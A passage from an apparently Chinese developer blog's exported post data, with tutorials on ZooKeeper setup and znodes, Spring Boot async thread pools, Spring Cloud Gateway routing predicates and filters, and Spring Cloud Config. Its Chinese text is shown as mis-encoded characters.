is like having a file-system that allows a file to also be a directory. (ZooKeeper was designed to store coordination data: status information, configuration, location information, etc., so the data stored at each node is usually small, in the byte to kilobyte range.) We use the term znode to make it clear that we are talking about ZooKeeper data nodes. Znodes maintain a stat structure that includes version numbers for data changes, ACL changes, and timestamps, to allow cache validations and coordinated updates. Each time a znode&apos;s data changes, the version number increases. For instance, whenever a client retrieves data it also receives the version of the data. The data stored at each znode in a namespace is read and written atomically. Reads get all the data bytes associated with a znode and a write replaces all the data. Each node has an Access Control List (ACL) that restricts who can do what. ZooKeeper also has the notion of ephemeral nodes. These znodes exists as long as the session that created the znode is active. When the session ends the znode is deleted. èŠ‚ç‚¹å’ŒçŸ­æš‚èŠ‚ç‚¹ ä¸æ ‡å‡†æ–‡ä»¶ç³»ç»Ÿä¸åŒï¼ŒZooKeeperå‘½åç©ºé—´ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹éƒ½å¯ä»¥å…·æœ‰ä¸å…¶å…³è”çš„æ•°æ®ä»¥åŠå­èŠ‚ç‚¹ã€‚ å°±åƒæ‹¥æœ‰ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸€æ ·ï¼Œè¯¥æ–‡ä»¶ç³»ç»Ÿä¹Ÿå…è®¸æ–‡ä»¶æˆä¸ºç›®å½•ã€‚ ï¼ˆZooKeeperæ—¨åœ¨å­˜å‚¨åè°ƒæ•°æ®ï¼šçŠ¶æ€ä¿¡æ¯ï¼Œé…ç½®ï¼Œä½ç½®ä¿¡æ¯ç­‰ï¼Œå› æ­¤å­˜å‚¨åœ¨æ¯ä¸ªèŠ‚ç‚¹ä¸Šçš„æ•°æ®é€šå¸¸å¾ˆå°ï¼Œåœ¨å­—èŠ‚åˆ°åƒå­—èŠ‚èŒƒå›´å†…ã€‚ï¼‰æˆ‘ä»¬ä½¿ç”¨æœ¯è¯­znodeæ¥æ˜ç¡®è¡¨ç¤º åœ¨è°ˆè®ºZooKeeperæ•°æ®èŠ‚ç‚¹ã€‚ Znodesç»´æŠ¤ä¸€ä¸ªç»Ÿè®¡ä¿¡æ¯ç»“æ„ï¼Œå…¶ä¸­åŒ…æ‹¬ç”¨äºæ•°æ®æ›´æ”¹ï¼ŒACLæ›´æ”¹å’Œæ—¶é—´æˆ³çš„ç‰ˆæœ¬å·ï¼Œä»¥å…è®¸è¿›è¡Œç¼“å­˜éªŒè¯å’Œåè°ƒæ›´æ–°ã€‚ znodeçš„æ•°æ®æ¯æ¬¡æ›´æ”¹æ—¶ï¼Œç‰ˆæœ¬å·éƒ½ä¼šå¢åŠ ã€‚ ä¾‹å¦‚ï¼Œæ¯å½“å®¢æˆ·ç«¯æ£€ç´¢æ•°æ®æ—¶ï¼Œå®ƒä¹Ÿæ¥æ”¶æ•°æ®çš„ç‰ˆæœ¬ã€‚ åŸå­åœ°è¯»å–å’Œå†™å…¥å­˜å‚¨åœ¨åç§°ç©ºé—´ä¸­æ¯ä¸ªznodeä¸Šçš„æ•°æ®ã€‚ è¯»å–å°†è·å–ä¸znodeå…³è”çš„æ‰€æœ‰æ•°æ®å­—èŠ‚ï¼Œè€Œå†™å…¥å°†æ›¿æ¢æ‰€æœ‰æ•°æ®ã€‚ æ¯ä¸ªèŠ‚ç‚¹éƒ½æœ‰ä¸€ä¸ªè®¿é—®æ§åˆ¶åˆ—è¡¨ï¼ˆACLï¼‰ï¼Œç”¨äºé™åˆ¶è°å¯ä»¥æ‰§è¡Œæ“ä½œã€‚ ZooKeeperè¿˜å…·æœ‰çŸ­æš‚èŠ‚ç‚¹çš„æ¦‚å¿µã€‚ åªè¦åˆ›å»ºznodeçš„ä¼šè¯å¤„äºæ´»åŠ¨çŠ¶æ€ï¼Œè¿™äº›znodeå°±å­˜åœ¨ã€‚ ä¼šè¯ç»“æŸæ—¶ï¼Œå°†åˆ é™¤znodeã€‚ Conditional updates and watches ZooKeeper supports the concept of watches. Clients can set a watch on a znode. A watch will be triggered and removed when the znode changes. When a watch is triggered, the client receives a packet saying that the znode has changed. If the connection between the client and one of the ZooKeeper servers is broken, the client will receive a local notification. æ¡ä»¶æ›´æ–°å’Œæ‰‹è¡¨ZooKeeperæ”¯æŒæ‰‹è¡¨çš„æ¦‚å¿µã€‚å®¢æˆ·ç«¯å¯ä»¥åœ¨znodeä¸Šè®¾ç½®æ‰‹è¡¨ã€‚å½“znodeå‘ç”Ÿå˜åŒ–æ—¶ï¼Œå°†è§¦å‘å¹¶åˆ é™¤ä¸€ä¸ªæ‰‹è¡¨ã€‚å½“ä¸€ä¸ªæ‰‹è¡¨è¢«è§¦å‘æ—¶ï¼Œå®¢æˆ·ç«¯ä¼šæ”¶åˆ°ä¸€ä¸ªæ•°æ®åŒ…ï¼Œè¯´znodeå·²ç»æ”¹å˜äº†ã€‚å¦‚æœå®¢æˆ·ç«¯å’Œä¸€ä¸ªZooKeeperæœåŠ¡å™¨ä¹‹é—´çš„è¿æ¥æ–­å¼€ï¼Œå®¢æˆ·ç«¯å°†æ”¶åˆ°ä¸€ä¸ªæœ¬åœ°é€šçŸ¥ã€‚å®‰è£…zookeeperStandalone Operation 1.ä¸‹è½½zookeeperï¼Œé€šè¿‡fileZileä¸Šä¼ ä¸Šå» tar -zxvf apache-zookeeper-3.6.0-bin.tar.gz 2.å®‰è£…java 3.å°†è§£å‹åçš„æ–‡ä»¶åé‡å‘½å mv apache-zookeeper-3.6.0-bin zookeeper å¹¶ç§»åŠ¨è‡³/usr/lib mv /tmp/zookeeper/ /usr/lib Standalone Operation å•å‡»æ¼”ç¤º 4.ç”Ÿæˆä¸€ä¸ªzoo.cfg vi conf zoo.cfg â€‹``` tickTime=2000 dataDir=/var/lib/zookeeper clientPort=2181 â€‹``` å¯åŠ¨ sh bin/zkServer.sh start 5.æµ‹è¯• sh bin/zkCli.sh -server 127.0.0.1:2181 ls / [ zookeeper] Next, create a new znode by running create /zk_test my_data. This creates a new znode and associates the string &quot;my_data&quot; with the node. You should see: [zkshell: 9] create /zk_test my_data Created /zk_test [zk: 127.0.0.1:2181(CONNECTED) 0] ls / [zk_test, zookeeper] [zk: 127.0.0.1:2181(CONNECTED) 3] get /zk_test my_data [zk: 127.0.0.1:2181(CONNECTED) 5] get -s /zk_test my_data cZxid = 0x3 ctime = Wed Apr 22 18:33:23 CST 2020 mZxid = 0x3 mtime = Wed Apr 22 18:33:23 CST 2020 pZxid = 0x3 cversion = 0 dataVersion = 0 aclVersion = 0 ephemeralOwner = 0x0 dataLength = 7 numChildren = 0 [zk: 127.0.0.1:2181(CONNECTED) 6] set /zk_test junk [zk: 127.0.0.1:2181(CONNECTED) 7] get -s /zk_test junk cZxid = 0x3 ctime = Wed Apr 22 18:33:23 CST 2020 mZxid = 0x7 mtime = Fri Apr 24 17:48:13 CST 2020 pZxid = 0x3 cversion = 0 dataVersion = 1 aclVersion = 0 ephemeralOwner = 0x0 dataLength = 4 numChildren = 0 å¯ä»¥çœ‹åˆ°mTimeè¢«æ”¹å˜äº†ï¼Œä»¥åŠznodeçš„å€¼ [zk: 127.0.0.1:2181(CONNECTED) 8] delete /zk_test åˆ é™¤/zk_test [zk: 127.0.0.1:2181(CONNECTED) 9] get -s /zk_test org.apache.zookeeper.KeeperException$NoNodeException: KeeperErrorCode = NoNode for /zk_testé›†ç¾¤æ¨¡å¼ åç»­å†ä»‹ç»","categories":[],"tags":[{"name":"ZooKeeper","slug":"ZooKeeper","permalink":"http://yoursite.com/tags/ZooKeeper/"},{"name":"zookeeper","slug":"zookeeper","permalink":"http://yoursite.com/tags/zookeeper/"}]},{"title":"springbootçº¿ç¨‹æ± ","slug":"springbootçº¿ç¨‹æ± ","date":"2020-04-20T09:12:01.000Z","updated":"2020-11-14T17:10:40.693Z","comments":true,"path":"2020/04/20/springbootçº¿ç¨‹æ± /","link":"","permalink":"http://yoursite.com/2020/04/20/springboot%E7%BA%BF%E7%A8%8B%E6%B1%A0/","excerpt":"","text":"é…ç½®ä¸€ä¸ªExecutorService@Configuration @EnableAsync public class BeanConfig { @Bean public ExecutorService getAsyncExecutor(){ ThreadPoolTaskExecutor executor = new ThreadPoolTaskExecutor(); executor.setCorePoolSize(7); executor.setMaxPoolSize(42); executor.setQueueCapacity(11); executor.setThreadNamePrefix(&quot;async-executor-&quot;); executor.initialize(); return executor.getThreadPoolExecutor(); } }ç¼–å†™package com.huskyui.currencyspringinaction.controller; import org.slf4j.Logger; import org.slf4j.LoggerFactory; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; import javax.annotation.Resource; import java.util.concurrent.*; /** * @author huskyui * @date 2020/4/17 15:50 */ @RestController public class HelloController { private Logger logger = LoggerFactory.getLogger(HelloController.class); @Resource private ExecutorService executorService; @RequestMapping(&quot;/sync&quot;) public String sync() { long start = System.currentTimeMillis(); int resultA = 0, resultB = 0; try { TimeUnit.SECONDS.sleep(2); resultA = 2; } catch (InterruptedException e) { e.printStackTrace(); } try { TimeUnit.SECONDS.sleep(1); resultB = 1; } catch (InterruptedException e) { e.printStackTrace(); } long cost = System.currentTimeMillis() - start; logger.info(&quot;sync cost:{} result {}&quot;, cost, (resultA + resultB)); return String.valueOf(resultA + resultB); } @RequestMapping(&quot;/async&quot;) public String async() throws ExecutionException, InterruptedException { long start = System.currentTimeMillis(); int result = 0; // Integeræ˜¯futureAçš„è¿”å‚ç±»å‹ CompletableFuture&lt;Integer&gt; futureA = CompletableFuture.supplyAsync(() -&gt; { // æ¨¡æ‹Ÿå·¥ä½œ1 try { TimeUnit.SECONDS.sleep(2); } catch (InterruptedException e) { e.printStackTrace(); } return 2; }, executorService); CompletableFuture&lt;Integer&gt; futureB = CompletableFuture.supplyAsync(() -&gt; { // æ¨¡æ‹Ÿå·¥ä½œ2 try { TimeUnit.SECONDS.sleep(1); } catch (InterruptedException e) { e.printStackTrace(); } return 1; }, executorService); CompletableFuture&lt;Void&gt; allFuture = CompletableFuture.allOf(futureA, futureB); allFuture.join(); result = futureA.get() + futureB.get(); long cost = System.currentTimeMillis() - start; logger.info(&quot;async cost:{} result {}&quot;, cost, result); return String.valueOf(result); } }æµ‹è¯•å¯ä»¥çœ‹åˆ°syncè¯·æ±‚æ—¶ï¼Œä¼šè€—æ—¶3ç§’ï¼Œasyncè¯·æ±‚ï¼Œè€—æ—¶2ç§’ æ„Ÿè°¢é˜…è¯»äº†ä¸€äº›å…¶ä»–äººçš„åšå®¢ï¼Œä»¥åŠNettyäº¤æµç¾¤é‡Œé¢å¤§ä½¬ä¼ æˆ ç¬¬äºŒç§å†™æ³•å¯ä»¥æŸ¥çœ‹ å®˜æ–¹æ•™ç¨‹ ä½¿ç”¨ @Async æ³¨è§£ @Service public class GitHubLookupService { private static final Logger logger = LoggerFactory.getLogger(GitHubLookupService.class); private final RestTemplate restTemplate; public GitHubLookupService(RestTemplateBuilder restTemplateBuilder) { this.restTemplate = restTemplateBuilder.build(); } @Async public CompletableFuture&lt;User&gt; findUser(String user) throws InterruptedException{ logger.info(&quot;Looking up &quot;+user); String url = String.format(&quot;https://api.github.com/users/%s&quot;,user); User results = restTemplate.getForObject(url,User.class); // Artificial delay of 1s for demonstration purpose Thread.sleep(1000L); return CompletableFuture.completedFuture(results); } } @Component public class AppRunner implements CommandLineRunner { private static final Logger logger = LoggerFactory.getLogger(AppRunner.class); private final GitHubLookupService gitHubLookupService; public AppRunner(GitHubLookupService githubLookupService) { this.gitHubLookupService = githubLookupService; } @Override public void run(String... args) throws Exception { // start the Clock long start = System.currentTimeMillis(); // Kick of multiple,asynchronous lookups CompletableFuture&lt;User&gt; page1 = gitHubLookupService.findUser(&quot;PivotalSoftware&quot;); CompletableFuture&lt;User&gt; page2 = gitHubLookupService.findUser(&quot;CloudFoundry&quot;); CompletableFuture&lt;User&gt; page3 = gitHubLookupService.findUser(&quot;Spring-Projects&quot;); CompletableFuture&lt;User&gt; page4 = gitHubLookupService.findUser(&quot;huskyui&quot;); // wait unit they are all done CompletableFuture.allOf(page1, page2, page3, page4).join(); logger.info(&quot;Elapsed time: &quot; + (System.currentTimeMillis() - start)); logger.info(&quot;--&gt;&quot; + page1.get()); logger.info(&quot;--&gt;&quot; + page2.get()); logger.info(&quot;--&gt;&quot; + page3.get()); logger.info(&quot;--&gt;&quot; + page4.get()); } }å½“ç„¶å¯¹äºï¼Œä»»åŠ¡çš„æ•°é‡ä¸å®šçš„è¯ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢è¿™å¼ æ–¹å¼ @Override public List&lt;String&gt; doTasks() throws InterruptedException, ExecutionException { List&lt;String&gt; result = new ArrayList&lt;&gt;(); List&lt;CompletableFuture&lt;String&gt;&gt; completableFutureList = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; 100; i++) { completableFutureList.add(taskService.doSingleTask(i)); } CompletableFuture&lt;String&gt;[] completableFutures = completableFutureList.toArray(new CompletableFuture[completableFutureList.size()]); CompletableFuture.allOf(completableFutures).join(); for(CompletableFuture&lt;String&gt; future:completableFutures){ result.add(future.get()); } return result; }","categories":[],"tags":[{"name":"spring","slug":"spring","permalink":"http://yoursite.com/tags/spring/"},{"name":"springboot","slug":"springboot","permalink":"http://yoursite.com/tags/springboot/"}]},{"title":"spring cloud gateway","slug":"spring cloud gateway","date":"2020-04-17T02:42:54.000Z","updated":"2020-11-14T17:10:41.445Z","comments":true,"path":"2020/04/17/spring cloud gateway/","link":"","permalink":"http://yoursite.com/2020/04/17/spring%20cloud%20gateway/","excerpt":"","text":"åœ¨å†™ä¹‹å‰ï¼Œæƒ³å†™ä¸€ä¸‹æ„Ÿå—ï¼Œä¹‹å‰æœ‰å¯¹æ¥è¿‡springcloudçš„é¡¹ç›®ï¼Œæœ‰ä»¥ä¸‹å‡ ä¸ªæ„Ÿå— 1.æˆ‘ä»¬è¯·æ±‚æ‰€æœ‰æ¥å£ï¼Œéƒ½æ˜¯è¯·æ±‚åŒä¸€ä¸ªç«¯å£ï¼Œè·¯å¾„ä¸åŒï¼Œéƒ½ä¼šåŠ ä¸€ä¸ªtokenæ¥éªŒè¯æƒé™ æˆ‘æ„Ÿè§‰æ˜¯è¿™ä¹ˆå®ç°çš„ï¼ŒæœåŠ¡å™¨å¯¹å¤–è®¿é—®åªå¼€æ”¾gatewayé¡¹ç›®ç«¯å£ï¼Œç„¶ååŠ ä¸€ä¸ªtokenæ¥å…¨å±€filter å½“ç„¶ï¼Œæˆ‘ä¸æ˜¯è¿™ä¸ªé¡¹ç›®çš„è®¾è®¡å¸ˆï¼Œè¿™æ˜¯å‡­ç©ºæƒ³è±¡è€Œå·²ã€‚ ç®€ä»‹This project provides an API Gateway built on top of the Spring Ecosystem,including: Spring 5, Spring Boot 2 and Project Reactor. Spring Cloud Gatewayaims to provide a simple, yet effective way to route to APIs and provide crosscutting concerns to them such as: security, monitoring/metrics, andresiliency. è¯¥é¡¹ç›®æä¾›äº†ä¸€ä¸ªåœ¨springç”Ÿæ€ç³»ç»Ÿä¸Šæ„å»ºçš„apiç½‘å…³ï¼ŒåŒ…æ‹¬spring 5,spring boot2å’Œproject reactor.springcloud gatewayæ—¨åœ¨æä¾›ä¸€ä¸ªç®€å•æœ‰æ•ˆçš„è·¯ç”±åˆ°apiså¹¶ä¸”æä¾›è·¨é¢†åŸŸçš„å…³æ³¨ç‚¹å¦‚ï¼šå®‰å…¨ï¼Œæ£€æµ‹ã€æŒ‡æ ‡å’Œå¼¹æ€§ã€‚ æœ¯è¯­ Route : The basic building block of the gateway. It is defined by an ID, a destination URI, a collection of predicates, and a collection of filters. A route is matched if the aggregate predicate is true.â€”-Routeæ˜¯gatewayä¸­æœ€åŸºæœ¬å—ï¼Œå¦‚æœæ‰€æœ‰predicateæ˜¯trueï¼Œé‚£ä¹ˆrouteä¼šè¢«åŒ¹é… Predicate : This is a Java 8 Function Predicate . The input type is a Spring Framework ServerWebExchange . This lets you match on anything from the HTTP request, such as headers or parameters.é€šè¿‡java8æä¾›çš„Predicateï¼Œæˆ‘ä»¬å¯ä»¥åŒ¹é…HttpRequestä¸­çš„ï¼Œheadersæˆ–è€…parameters Filter : These are instances of Spring Framework GatewayFilter that have been constructed with a specific factory. Here, you can modify requests and responses before or after sending the downstream request.æˆ‘ä»¬å¯ä»¥åœ¨å‘é€ç»™ä¸‹æ¸¸ä¹‹å‰ä¿®æ”¹è¯·æ±‚æˆ–è€…ä¹‹åä¿®æ”¹è¿”å›å›æ¥çš„å“åº”ã€‚è¿™é‡Œï¼Œæˆ‘ä»¬ç”¨ä¸‹é¢ä¸€å¼ å›¾æ¥è§£é‡Š â€‹ ä»å›¾ä¸­ï¼Œæˆ‘ä»¬éœ€è¦æ³¨æ„åˆ°Filterä¸­æ˜¯æ”¯æŒè¯·æ±‚å‰ï¼Œå’Œå“åº”åçš„å¤„ç†çš„ è£…é…spring cloud gatewaypom &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--æš‚æ—¶å…ˆæ³¨é‡Š &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt; --&gt; &lt;!--spring cloud version :Hoxton.SR3--&gt;application.yml management: endpoints: web: exposure: include: &quot;*&quot; server: port: 10000 #spring: æ­¤å¤„æ³¨é‡Šæ”¹ä¸ºjavaæ³¨å…¥ # cloud: # gateway: # routes: # - id: first # uri: http://localhost:9000 # predicates: # - Path=/** logging: level: org.springframework.cloud.gateway: debugjavaæ³¨å…¥ @Bean public RouteLocator customerRouteLocator(RouteLocatorBuilder builder){ return builder.routes() .route(r-&gt;r.path(&quot;/**&quot;) .uri(&quot;http://localhost:9000&quot;).id(&quot;first&quot;) ).build(); }æµ‹è¯• D:\\gitclonepackage\\cloud&gt;curl http://localhost:10000/hello/huskyui hello, huskyui Mon Apr 13 17:25:28 CST 2020ä»‹ç»predicatejava8ä¸­çš„predicate,å°±æ˜¯filteré‡Œé¢çš„å‡½æ•°ã€‚è¿™æ˜¯ä¸€ä¸ªæ¯”è¾ƒç›´è§‚çš„ä¾‹å­ List&lt;Integer&gt; list = new ArrayList&lt;&gt;(Arrays.asList(1,2,3,4,5,6,7,8,9)); list.stream().filter(t-&gt;t&lt;5).forEach(System.out::println); è¾“å‡º 1,2,3,4PathRoutePredicateFactory@Bean public RouteLocator customerRouteLocator(RouteLocatorBuilder builder){ return builder.routes() .route(r-&gt;r.path(&quot;/**&quot;) .uri(&quot;http://localhost:9000&quot;).id(&quot;first&quot;) ).build(); } æ”¾å¼€äº†/**,ä¹Ÿå°±æ˜¯æ”¾å¼€äº†æ‰€æœ‰http://localhost:9000æ‰€æœ‰è·¯å¾„ D:\\gitclonepackage\\cloud&gt;curl http://localhost:10000/hello/huskyui hello, huskyui Mon Apr 13 17:25:28 CST 2020CookieRoutePredicateFactory @Bean public RouteLocator customerRouteLocator(RouteLocatorBuilder builder){ return builder.routes() .route(r-&gt;r .cookie(&quot;token&quot;,&quot;kee.e&quot;) .uri(&quot;http://localhost:9000&quot;).id(&quot;first&quot;) ).build(); } D:\\gitclonepackage\\cloud&gt;curl http://localhost:10000/hello/huskyui {&quot;timestamp&quot;:&quot;2020-04-13T10:03:43.548+0000&quot;,&quot;path&quot;:&quot;/hello/huskyui&quot;,&quot;status&quot;:404,&quot;error&quot;:&quot;Not Found&quot;,&quot;message&quot;:null,&quot;requestId&quot;:&quot;b330030a-1&quot;} D:\\gitclonepackage\\cloud&gt;curl http://localhost:10000/hello/huskyui --cookie &quot;token=keexe&quot; hello, huskyui Mon Apr 13 18:03:55 CST 2020 D:\\gitclonepackage\\cloud&gt;curl http://localhost:10000/hello/huskyui --cookie &quot;token=keeeee&quot; {&quot;timestamp&quot;:&quot;2020-04-13T10:09:09.207+0000&quot;,&quot;path&quot;:&quot;/hello/huskyui&quot;,&quot;status&quot;:404,&quot;error&quot;:&quot;Not Found&quot;,&quot;message&quot;:null,&quot;requestId&quot;:&quot;23aba850-3&quot;}ç»„åˆä½¿ç”¨ @Bean public RouteLocator customerRouteLocator(RouteLocatorBuilder builder){ return builder.routes() .route(r-&gt;r .method(HttpMethod.POST) .and() .path(&quot;/**&quot;) .and() .cookie(&quot;token&quot;,&quot;kee.e&quot;) .uri(&quot;http://localhost:9000&quot;).id(&quot;first&quot;) ).build(); } D:\\gitclonepackage\\cloud&gt;curl -X POST http://localhost:10000/hello/huskyui --cookie &quot;token=keeie&quot; hello, huskyui Mon Apr 13 18:13:54 CST 2020è‡ªå®šä¹‰Predicate// æˆ‘ä»¬å…ˆå»çœ‹ä¸€ä¸‹cookieåˆ¤æ–­çš„æºç  CookieRoutePredicateFactory.java @Override public Predicate&lt;ServerWebExchange&gt; apply(Config config) { return new GatewayPredicate() { @Override public boolean test(ServerWebExchange exchange) { List&lt;HttpCookie&gt; cookies = exchange.getRequest().getCookies() .get(config.name); if (cookies == null) { return false; } for (HttpCookie cookie : cookies) { if (cookie.getValue().matches(config.regexp)) { return true; } } return false; } @Override public String toString() { return String.format(&quot;Cookie: name=%s regexp=%s&quot;, config.name, config.regexp); } }; } // å¾ˆå¥½ç†è§£çš„ä»£ç ï¼Œæˆ‘ä»¬å†™ä¸€ä¸²headeråˆ¤æ–­çš„ @Bean public RouteLocator customerRouteLocator(RouteLocatorBuilder builder) { return builder.routes() .route(r -&gt; r.predicate(t -&gt; { List&lt;String&gt; values= t.getRequest().getHeaders().get(&quot;token&quot;); if(values==null || values.isEmpty()){ return false; } return values.stream().anyMatch(value-&gt;value.equals(&quot;123456&quot;)); }) .uri(&quot;lb://eureka-consumer&quot;).id(&quot;first&quot;) ).build(); } D:\\gitclonepackage\\cloud&gt;curl -X POST http://localhost:10000/hello/huskyui --header &quot;token: 123456&quot; hello, huskyui Thu Apr 16 14:58:20 CST 2020ä»‹ç»filterRoute filters allow the modification of the incoming HTTP request or outgoingHTTP response in some manner. Route filters are scoped to a particular route.Spring Cloud Gateway includes many built-in GatewayFilter Factories. è·¯ç”±è¿‡æ»¤å™¨å¯ä»¥ä¿®æ”¹HTTPè¯·æ±‚å’ŒHTTPå“åº”ï¼Œè·¯ç”±è¿‡æ»¤å™¨çš„ä½œç”¨åŸŸæ˜¯ç‰¹å®šçš„è·¯ç”±ã€‚spring cloud gatewayæœ‰å¾ˆå¤šå†…ç½®çš„ç½‘å…³è¿‡æ»¤å™¨çš„å·¥å‚ã€‚ ä½¿ç”¨PathRoutePredicateFactoryå’ŒStripPrefixGatewayFilterFactoryå®ç°å¯¹ç‰¹å®šé¡¹ç›®è®¿é—® @Bean public RouteLocator customerRouteLocator(RouteLocatorBuilder builder) { return builder.routes() .route(r -&gt; r.path(&quot;/consumer/**&quot;) .filters(f-&gt;f.stripPrefix(1)) .uri(&quot;lb://eureka-consumer&quot;).id(&quot;first&quot;) ).build(); } D:\\gitclonepackage\\cloud&gt;curl -X POST http://localhost:10000/consumer/hello/huskyui hello, huskyui Thu Apr 16 15:16:31 CST 2020 // åœ¨è®¿é—®çš„æ—¶å€™ï¼Œç”±äºstripPrefixæ˜¯1ï¼Œä¼šå»é™¤/consumerè¿™ä¸€å±‚ï¼ŒçœŸæ­£çš„ä¼šè½¬å‘æˆ // lb://eureka-consumer/hello/huskyuiä¿®æ”¹RequestBodyä¸­ä¿¡æ¯ @Bean public RouteLocator customerRouteLocator(RouteLocatorBuilder builder) { return builder.routes() .route(r -&gt; r.path(&quot;/producer/**&quot;) .filters(f -&gt; f.stripPrefix(1) .modifyRequestBody(Map.class, Map.class, MediaType.APPLICATION_JSON_VALUE, (serverWebExchange, s) -&gt; { System.out.println(s); s.put(&quot;name&quot;,&quot;adios&quot;); return Mono.just(s); })) .uri(&quot;lb://eureka-producer&quot;).id(&quot;first&quot;) ).build(); } // å¯ä»¥çœ‹åˆ°è¿™ä¸ªsçš„ç±»å‹æ˜¯Map.class,æˆ‘ä¿®æ”¹çš„å¯¹åº”nameçš„å€¼ï¼Œ POST http://localhost:10000/producer/hello Content-Type: application/json { &quot;name&quot;: &quot;huskyui&quot; } hello, adios Thu Apr 16 18:34:56 CST 2020 // å¯ä»¥çœ‹åˆ°æˆ‘ä¿®æ”¹å¯¹åº”çš„requestBodyçš„å€¼ï¼Œåœ¨æ§åˆ¶å°ä¹Ÿæ‰“å°äº†åˆå§‹RequestBodyè¯·æ±‚jsonï¼ˆä¸Šé¢è¯·æ±‚æ–¹å¼æ˜¯é€šè¿‡ideaé‡Œé¢å†…ç½®çš„è¯·æ±‚æ–¹å¼ï¼‰å…¨å±€æ‹¦æˆªå™¨The GlobalFilter interface has the same signature as GatewayFilter .These are special filters that are conditionally applied to all routes. GlobalFilteræ¥å£å…·æœ‰ä¸gatewayFilterç›¸åŒçš„ç­¾åï¼Œè¿™äº›æ˜¯ç‰¹æ®Šè¿‡æ»¤å™¨ï¼Œæœ‰æ¡ä»¶åœ°åº”ç”¨äºæ‰€æœ‰è·¯ç”±ã€‚ åç»­ä»ç°åœ¨å¼€å§‹ï¼Œæš‚åœæ›´æ–°spring cloud gatewayç›¸å…³åšå®¢ï¼Œæˆ‘å…ˆå»å­¦ç‚¹åˆ«çš„äº†ã€‚å­¦ä¹ è¿™ç§å¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ã€‚ å‚è€ƒ çº¯æ´çš„å¾®ç¬‘å†™çš„spring cloudæ–‡æ¡£ windmtå†™çš„æ–‡æ¡£ [ spring cloud gatewayå®˜æ–¹æ–‡æ¡£ ](https://cloud.spring.io/spring-cloud-static/spring-cloud-gateway/2.2.2.RELEASE/reference/html/#gateway-starter) [ githubä¸Šspring cloud gatewayæä¾›çš„samples ](https://github.com/spring-cloud/spring-cloud-gateway/tree/master/spring-cloud-gateway-sample/src/main/java/org/springframework/cloud/gateway/sample)","categories":[],"tags":[{"name":"spring","slug":"spring","permalink":"http://yoursite.com/tags/spring/"},{"name":"spring cloud","slug":"spring-cloud","permalink":"http://yoursite.com/tags/spring-cloud/"}]},{"title":"SpringCloud-config","slug":"SpringCloud-config","date":"2020-03-30T07:59:08.000Z","updated":"2020-11-14T17:10:42.020Z","comments":true,"path":"2020/03/30/SpringCloud-config/","link":"","permalink":"http://yoursite.com/2020/03/30/SpringCloud-config/","excerpt":"","text":"Spring Cloud Configç®€ä»‹Spring Cloud Config provides server-side and client-side support forexternalized configuration in a distributed system. With the Config Server,you have a central place to manage external properties for applications acrossall environments. The concepts on both client and server map identically tothe Spring Environment and PropertySource abstractions, so they fitvery well with Spring applications but can be used with any applicationrunning in any language. As an application moves through the deploymentpipeline from dev to test and into production, you can manage theconfiguration between those environments and be certain that applications haveeverything they need to run when they migrate. The default implementation ofthe server storage backend uses git, so it easily supports labelled versionsof configuration environments as well as being accessible to a wide range oftooling for managing the content. It is easy to add alternativeimplementations and plug them in with Spring configuration. Spring Cloud Configä¸ºåˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„å¤–éƒ¨åŒ–é…ç½®æä¾›äº†æœåŠ¡å™¨ç«¯å’Œå®¢æˆ·ç«¯æ”¯æŒã€‚æœ‰äº†ConfigServerï¼Œæ‚¨å°±æœ‰äº†ä¸€ä¸ªä¸­å¿ƒä½ç½®æ¥ç®¡ç†è·¨æ‰€æœ‰ç¯å¢ƒçš„åº”ç”¨ç¨‹åºçš„å¤–éƒ¨å±æ€§ã€‚å®¢æˆ·æœºå’ŒæœåŠ¡å™¨ä¸Šçš„æ¦‚å¿µä¸Springç¯å¢ƒå’ŒPropertySourceæŠ½è±¡å®Œå…¨ç›¸åŒï¼Œå› æ­¤å®ƒä»¬éå¸¸é€‚åˆSpringåº”ç”¨ç¨‹åºï¼Œä½†å¯ä»¥ç”¨äºä»¥ä»»ä½•è¯­è¨€è¿è¡Œçš„ä»»ä½•åº”ç”¨ç¨‹åº.å½“åº”ç”¨ç¨‹åºé€šè¿‡éƒ¨ç½²ç®¡é“ä»devè½¬ç§»åˆ°æµ‹è¯•å¹¶è¿›å…¥ç”Ÿäº§ç¯å¢ƒæ—¶ï¼Œæ‚¨å¯ä»¥åœ¨ä¸¤è€…ä¹‹é—´ç®¡ç†é…ç½®.æœåŠ¡å™¨å­˜å‚¨åç«¯é»˜è®¤çš„å®ç°ä½¿ç”¨gitï¼Œå› æ­¤å®ƒå¾ˆå®¹æ˜“æ”¯æŒé…ç½®ç¯å¢ƒçš„æ ‡è®°ç‰ˆæœ¬ï¼Œå¹¶ä¸”å¯ä»¥è®¿é—®å„ç§å„æ ·çš„å·¥å…·æ¥ç®¡ç†å†…å®¹ã€‚å¾ˆå®¹æ˜“æ·»åŠ æ›¿ä»£å®ç°å¹¶å°†å®ƒä»¬æ’å…¥Springé…ç½®ä¸­ config-serveråˆ›å»ºä¸€ä¸ªé…ç½®ä»“åº“ å…·ä½“æ ·å¼ï¼Œå¯ä»¥çœ‹https://github.com/huskyui/config-repo åœ¨ spring-cloud ä¸‹é¢æœ‰ä¸‰ä¸ªæ–‡ä»¶ï¼Œ config-dev.yml å’Œ config-prod.yml å’Œ config-test.yml å¯¼å…¥pom &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-config-server&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--spring-cloud.version Hoxton.SR3 --&gt;application.yml spring: application: name: config-server cloud: config: server: git: uri: https://github.com/huskyui/config-repo # uri search-paths: spring-cloud # å±‚çº§ server: port: 12000 